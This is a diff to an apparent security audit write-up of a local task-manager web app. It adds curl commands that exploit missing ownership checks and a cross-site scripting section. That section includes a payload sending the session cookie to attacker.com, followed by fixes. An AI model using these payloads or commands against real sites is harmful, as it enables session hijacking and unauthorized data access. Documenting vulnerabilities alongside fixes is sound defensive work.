@@ -47,7 +47,9 @@ task endpoints do not verify ownership. any authenticated user can read, modify,
 **exploit:**
 ```bash
 # read all users' tasks
-curl -b cookies.txt http://localhost:8080/tasks
+curl -c cookies.txt -b cookies.txt -X POST http://localhost:8080/api/login \
+  -H "Content-Type: application/json" \
+  -d "{\"username\":\"cat\",\"password\":\"meow\"}" && curl -b cookies.txt http://localhost:8080/tasks
 
 # modify another user's task (id=2, owned by user 2)
 curl -b cookies.txt -X PUT http://localhost:8080/tasks/2 \
@@ -75,4 +77,28 @@ if task.OwnerID != callerID {
 
 // always assign owner from session, never from request body
 newTask.OwnerID = callerID
+```
+
+## 3. cross-site scripting (XSS)
+
+task titles are rendered via `innerHTML`, treating user input as raw HTML. any script embedded in a title executes in the victim's browser.
+
+**exploit:**
+```
+# enter this as a task title
+<img src=x onerror="alert('XSS!')">
+
+# realistic payload — steals session cookie
+<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
+```
+
+**impact:** session hijacking, credential theft, arbitrary JS execution.
+
+**fix:**
+```js
+// before (vulnerable)
+createTaskContent.innerHTML = task.title;
+
+// after (safe)
+createTaskContent.textContent = task.title;
 ```
